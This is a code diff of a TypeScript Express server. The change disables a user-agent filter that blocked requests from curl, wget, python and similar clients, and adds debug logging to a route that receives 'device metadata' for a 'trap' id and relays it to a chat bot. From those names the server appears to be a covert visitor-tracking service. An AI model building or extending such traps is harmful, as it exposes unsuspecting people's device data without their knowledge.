@@ -52,15 +52,6 @@ async function startServer() {
   const suspeciousAgents = ['amphp', 'python', 'go-http-client', 'curl', 'wget'];
 
    const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
-    if (!userAgent) {
-      console.log('[DEBUG] Blocking request with empty User-Agent');
-      return true; // Still block empty
-    }
-    const ua = userAgent.toLowerCase();
-    const isSus = suspeciousAgents.some(agent => ua.includes(agent));
-    if (isSus) {
-      console.log(`[DEBUG] Detected suspicious User-Agent, but proceeding: ${userAgent}`);
-    }
     return false; // Proceed anyway
   };
 
@@ -405,7 +396,11 @@ async function startServer() {
 
   // Handle Device Metadata Upload
   app.post('/api/log/:id/info', (req, res) => {
-    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
+    console.log(`[DEBUG] Received info log for ${req.params.id}`);
+    if (isSuspeciousAgent(req.headers['user-agent'])) {
+        console.log(`[DEBUG] Blocked info log for ${req.params.id} due to User-Agent`);
+        return res.sendStatus(403);
+    }
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
